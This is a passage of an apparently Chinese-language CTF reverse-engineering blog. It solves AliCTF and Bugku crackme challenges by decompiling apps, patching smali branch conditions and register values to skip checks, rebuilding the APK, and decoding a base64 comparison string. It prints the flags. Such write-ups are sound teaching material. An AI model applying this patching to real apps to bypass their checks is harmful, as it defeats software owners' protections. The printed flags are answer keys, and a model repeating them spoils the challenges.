plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public MainActivity() &#123;</span><br><span class="line">super();</span><br><span class="line">this.beg = (((int)&gt;(System.currentTimeMillis() / 1000))) + 200000;  </span><br><span class="line"> //当前时间(beg)为200000加上当前时间(s)    </span><br><span class="line">this.k = 0;    </span><br><span class="line"> //k初始化为0,和onCreate函数中的flag字符串存在联系</span><br><span class="line">this.t = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>查看onCreate回调的is2函数</p><p><img src="https://i.loli.net/2019/04/10/5cadc494aef1e.png" alt="is2.png"></p></li></ul></li></ul><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><ul><li><p>由于md渲染问题,代码放于文末</p></li><li><p>运行结果</p><p><code>k=1616384</code></p></li></ul><h2 id="Android-killer修改并打包源程序"><a href="#Android-killer修改并打包源程序" class="headerlink" title="Android killer修改并打包源程序"></a>Android killer修改并打包源程序</h2><ul><li><p>进入入口类</p><p><img src="https://i.loli.net/2019/04/10/5cadd09e36dc6.png" alt="载入程序.png"></p></li><li><p>搜索字符串 <code>AliCTF</code></p><p><img src="https://i.loli.net/2019/04/10/5cadd1383063a.png" alt="AliCTF.png"></p><p><img src="https://i.loli.net/2019/04/10/5cadd1a7a01b0.png" alt="搜索字符串.png"></p></li><li><p>定位到变量 <code>k</code></p><blockquote><p>搜索<code>stringFromJNI2</code>  </p><p><img src="https://i.loli.net/2019/04/10/5cadd332ec48c.png" alt="stringFromJNI2.png">  </p><blockquote><p>上一条句把k存放在寄存器<code>v3</code>中,下面修改v3,就可以修改k<br> 寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、…</p></blockquote></blockquote></li><li><p>修改变量k的值</p><blockquote><p><code>const v3;1616384</code>  </p><p><img src="https://i.loli.net/2019/04/10/5cadd3f6dfb97.png" alt="修改变量k.png"></p></blockquote></li><li><p>理一理思路</p><blockquote><p>这里我把<code>k</code>的值设置为正确的值,即执行200000次后会出现的值了  </p><p>但是因为if条件判断为假,程序还是会执行200000次，才会输出flag  </p><p>这里就需要把<code>&lt;=</code>改为<code>&gt;</code>  </p><blockquote><p>搜索<code>&lt;=</code>附近的字符串<code>AliCTF</code></p></blockquote></blockquote></li><li><p>修改if判断条件</p><p><img src="https://i.loli.net/2019/04/10/5cadd86d23ea4.png" alt="反过来了.png"></p><blockquote><p>发现这里是反过来的,下一步把 <code>&gt;</code> 改成 <code>&lt;=</code> </p><p>将<code>if-gtz v0, :cond_0</code>修改为<code>if-lez v0, :cond_0</code>  </p><blockquote><p><img src="https://i.loli.net/2019/04/10/5cadd8f83b3c1.png" alt="小于.png"></p></blockquote></blockquote></li><li><p>编译打包程序  </p><blockquote><p>在编译的时候遇到以下问题<br> &gt;&gt;Project\res\values-v23\styles.xml:6: error: Error retrieving  parent for item: No resource found that matches the given name  ‘@android:style/WindowTitleBackground’.<br> &gt;&gt;<br> &gt;&gt;Project\res\values-v23\styles.xml:6: error: Error retrieving  parent for item: No resource found that matches the given name  ‘@android:style/WindowTitleBackground’.</p></blockquote></li><li><p>解决方法</p><blockquote><p>找到res/value-v23/styles.xml，把resources下的东西注释掉  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt; &lt;resources&gt;</span><br><span class="line">&gt; &lt;!--</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; --&gt;</span><br><span class="line">&gt; &lt;/resources&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>&gt; 找到res/value/public.xml，把所有带Base.V23的东西（两个）注释掉  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt; &lt;resources&gt;</span><br><span class="line">&gt; &lt;!--</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; --&gt;</span><br><span class="line">&gt; &lt;/resources&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>重新编译打包  </p><p><img src="https://i.loli.net/2019/04/10/5cadeb314bca4.png" alt="编译成功.png"></p></li></ul><h3 id="模拟器载入新安装包"><a href="#模拟器载入新安装包" class="headerlink" title="模拟器载入新安装包"></a>模拟器载入新安装包</h3><ul><li><p>成功获取flag</p><p><img src="https://i.loli.net/2019/04/10/5cadebc91d750.png" alt="flag.png"></p></li><li><p>flag<br> <code>flag{Y0vAr3TimerMa3te7}</code></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>环境问题</p><blockquote><p>Android Killer编译apk始终失败  </p><blockquote><p>通过换jdk7以及修改res/xml成功编译  </p></blockquote><p>运行Jeb闪退  </p><blockquote><p>修改jeb_winos.bat,替换java版本<br> <img src="https://i.loli.net/2019/04/10/5cadee07e601d.png" alt="java版本.png">  </p></blockquote></blockquote></li><li><p>技术问题  </p><blockquote><p>不懂smati语言,但是Jeb和AK自身的伪代码转义功能较强,还是可以看懂程序流程 </p><p>下来需要潜心学习smati语法</p><p>本例程序代码量很少,遇到大型程序不会这么简单  </p></blockquote></li></ul><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"><span class="function">bool <span class="title">is2</span><span class="params">(<span class="keyword">int</span> arg4)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        bool v1 = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg4 &gt; <span class="number">3</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg4 % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; arg4 % <span class="number">3</span> != <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> v0 = <span class="number">5</span>;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v0 * v0 &lt;= arg4) </span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(arg4 % v0 != <span class="number">0</span> &amp;&amp; arg4 % (v0 + <span class="number">2</span>) != <span class="number">0</span>) </span><br><span class="line">                        &#123;</span><br><span class="line">                            v0 += <span class="number">6</span>;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> </span><br><span class="line">                        <span class="keyword">return</span> v1;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v1 = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(arg4 &lt;= <span class="number">1</span>) </span><br><span class="line">            v1 = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> time = <span class="number">200000</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(time &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(is2(time))</span><br><span class="line">                k+=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                k--;  </span><br><span class="line">        time--;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">"k="</span> &lt;&lt; k &lt;&lt; endl ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h2><p>发现不是有效的<strong>pe</strong>文件，用<strong>VisualStudio Code</strong>打开试试,发现是<strong>“image/png；base64”</strong>，猜测是经过<strong>base64</strong>加密的图片，将整段内容复制下来，<strong>base64</strong>转图片</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/Bugku/Re/index.png" alt></p><p>扫描二维码，得到flag：<strong>bugku{inde_9882ihsd8-0}</strong> </p><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>盲猜flag：I love you，算了不说笑了，还是真实做题吧</p><p>载入OD</p><p>搜索字符串</p><p><img src="https://img-blog.csdn.net/20171228160459980" alt="img"></p><p>随意输入1111111111111111111</p><p><img src="https://img-blog.csdn.net/20171228160500294" alt="img"></p><p><img src="https://img-blog.csdn.net/20171228160501460" alt="img"></p><p>发现进行了base64加密</p><p>再向下单步 发现、</p><p><img src="https://img-blog.csdn.net/20171228160502178" alt="img"></p><p>结合IDA看下</p><p><img src="https://img-blog.csdn.net/20171228160503183" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4156E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v0;<span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line">constchar*v1;<span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v2;<span class="comment">// eax@9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v4;<span class="comment">// [sp+0h] [bp-188h]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v5;<span class="comment">// [sp+Ch] [bp-17Ch]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> v6;<span class="comment">// [sp+10h] [bp-178h]@3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> j;<span class="comment">// [sp+DCh] [bp-ACh]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> i;<span class="comment">// [sp+E8h] [bp-A0h]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Dest[<span class="number">108</span>];<span class="comment">// [sp+F4h] [bp-94h]@5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Str;<span class="comment">// [sp+160h] [bp-28h]@6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v11;<span class="comment">// [sp+17Ch] [bp-Ch]@6</span></span><br><span class="line"></span><br><span class="line">unsignedint v12;<span class="comment">// [sp+184h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> savedregs;<span class="comment">// [sp+188h] [bp+0h]@1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v5,<span class="number">0xCC</span>u,<span class="number">0x17C</span>u);</span><br><span class="line"></span><br><span class="line">v12 =(unsignedint)&amp;savedregs ^ __security_cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( i =<span class="number">0</span>;(signedint)i &lt;<span class="number">100</span>;++i )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">v6 = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( i &gt;=<span class="number">0x64</span>)</span><br><span class="line"></span><br><span class="line">sub_411154();</span><br><span class="line"></span><br><span class="line">Dest[v6]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"please enter the flag:"</span>, v4);</span><br><span class="line"></span><br><span class="line">sub_411375(<span class="string">"%20s"</span>,(unsignedint)&amp;Str);</span><br><span class="line"></span><br><span class="line">v0 = j_strlen(&amp;Str);</span><br><span class="line"></span><br><span class="line">v1 =(constchar*)sub_4110BE(&amp;Str, v0,&amp;v11);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(Dest, v1,<span class="string">'('</span>);</span><br><span class="line"></span><br><span class="line">sub_411127();</span><br><span class="line"></span><br><span class="line">i = j_strlen(Dest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( j =<span class="number">0</span>;(signedint)j &lt;(signedint)i;++j )</span><br><span class="line"></span><br><span class="line">Dest[j]+= j;</span><br><span class="line"></span><br><span class="line">v2 = j_strlen(Dest);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncmp</span>(Dest, Str2, v2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( sub_411127())</span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"wrong flag!\n"</span>, v4);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">sub_41132F(<span class="string">"rigth flag!\n"</span>, v4);</span><br><span class="line"></span><br><span class="line">sub_41126C(&amp;savedregs,&amp;dword_415890);</span><br><span class="line"></span><br><span class="line">sub_411280();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sub_411127();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知:将输入的串<strong>Str1</strong>先进行<strong>base64</strong>加密 再与串<strong>Str2</strong>比较 若相等 则输出<strong>“right flag”</strong></p><p>由此，我们只需将<strong>Str2</strong>也就是<strong>“e3nifIH9b_C@n@dH”</strong>进行解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s =<span class="string">"e3nifIH9b_C@n@dH"</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"></span><br><span class="line">flag += chr(ord(s[i])- i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>最后拿到答案<strong>flag{i_l0ve_you}</strong></p><h2 id="LoopAndLoop"><a href="#LoopAndLoop" class="headerlink" title="LoopAndLoop"></a>LoopAndLoop</h2><p>载入JEB，双击<strong>MainActivity</strong>，选择<strong>Decompilea class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;  <span class="comment">// System.loadLibrary()是我们在使用Java的JNI机制时，会用到的一个非常重要的函数</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"lhm"</span>);  <span class="comment">// 它的作用即是把我们在Java code中声明的native方法的那个libraryload进来，或者load其他什么动态连接库</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">chec</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;  <span class="comment">// native层的chec方法</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// check方法将我们的输入和一个int型变量s返回到chec</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(input, s);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// check1定义v1为我们的输入，v0为循环变量1</span></span><br><span class="line">        <span class="keyword">int</span> v1 = input;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    label_2:  <span class="comment">// 进入到label_2</span></span><br><span class="line">        <span class="keyword">if</span>(v0 &lt; <span class="number">100</span>) &#123;</span><br><span class="line">            v1 += v0;  <span class="comment">// 先判断v0是否小于100，如果成立，那么v1每次加上v0的值</span></span><br><span class="line">            ++v0;  <span class="comment">// v0每次也要自增1</span></span><br><span class="line">            goto label_2;  <span class="comment">// 直接走向label_2</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(v1, s);  <span class="comment">// 还是将得到的v1及s返回给chec方法</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;  <span class="comment">// 和上面的check与check1一样，都是需要两个参数，一个是我们的输入，一个是s</span></span><br><span class="line">        <span class="keyword">int</span> v2;  <span class="comment">// v2还是作为chec方法的返回值</span></span><br><span class="line">        <span class="keyword">int</span> v3 = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">int</span> v1 = input;  <span class="comment">// 定义三个int型变量，v1还是我们的输入，v3做为定值1000，而v2作为返回值(相当于一个标志)</span></span><br><span class="line">        <span class="keyword">if</span>(s % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> v0;  <span class="comment">// 当s对2取余等于0，也就是说s能被2整除时，定义一个新的循环变量v0</span></span><br><span class="line">            <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; v3; ++v0) &#123;</span><br><span class="line">                v1 += v0;  <span class="comment">// v0等于1，当小于v3的值也就是小于1000时，v1每次加上v0，v0++</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            v2 = <span class="keyword">this</span>.chec(v1, s);  <span class="comment">// v2还是作为chec方法的返回值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; v3; ++v0) &#123;<span class="comment">//如果取余不等于0，那么还是和上边一样，只不过v1每次减去v0</span></span><br><span class="line">                v1 -= v0;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            v2 = <span class="keyword">this</span>.chec(v1, s);<span class="comment">//chec方法的返回值</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> v2;<span class="comment">//返回v2</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> input, <span class="keyword">int</span> s)</span> </span>&#123;<span class="comment">//check3将输入给v1，将循环变量v0初值设为1，当v0小于10000，v1每次加上v0,而v0循环一次就加1</span></span><br><span class="line">        <span class="keyword">int</span> v1 = input;</span><br><span class="line">        <span class="keyword">int</span> v0;</span><br><span class="line">        <span class="keyword">for</span>(v0 = <span class="number">1</span>; v0 &lt; <span class="number">10000</span>; ++v0) &#123;</span><br><span class="line">            v1 += v0;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chec(v1, s);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">messageMe</span><span class="params">(String text)</span> </span>&#123;<span class="comment">//messageMe方法是返回字符串"LoopOk"+text</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"LoopOk"</span> + text;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;<span class="comment">//关键的方法onCreate</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">2130968600</span>);<span class="comment">//这两行和布局有关，不用管</span></span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">2131492946</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;<span class="comment">//最最重要的,从名字就可以看出，当我们点击GETYOURFLAG！这个按钮时触发的onClick</span></span><br><span class="line">                <span class="keyword">int</span> v1;</span><br><span class="line">                String v2 = <span class="keyword">this</span>.val$ed.getText().toString();<span class="comment">//v2获取我们的输入并转成字符串</span></span><br><span class="line">                <span class="keyword">try</span> &#123;  <span class="comment">//下边这个try,catch用来捕获将类型异常</span></span><br><span class="line">                    v1 = Integer.parseInt(v2);<span class="comment">//将v2这个String字符类型数据转换为Integer整型数据赋值给v1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NumberFormatException v0) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"Not a Valid Integer number"</span>);<span class="comment">//如果不可以转成整数，就在屏幕打印"不是一个有效的整数"</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.check(v1, <span class="number">99</span>) == <span class="number">1835996258</span>) &#123;<span class="comment">//如果我们输入的v1和s也就是99传给check方法，</span></span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"The flag is:"</span>);<span class="comment">//接着传向chec方法得到的返回值等于1835996258，就输出flag</span></span><br><span class="line">                    <span class="keyword">this</span>.val$tv2.setText(<span class="string">"alictf&#123;"</span> + MainActivity.<span class="keyword">this</span>.stringFromJNI2(v1) + <span class="string">"&#125;"</span>);<span class="comment">//括号内是native层stringFromJNI2()方法处理v1后的</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$tv1.setText(<span class="string">"Not Right!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span 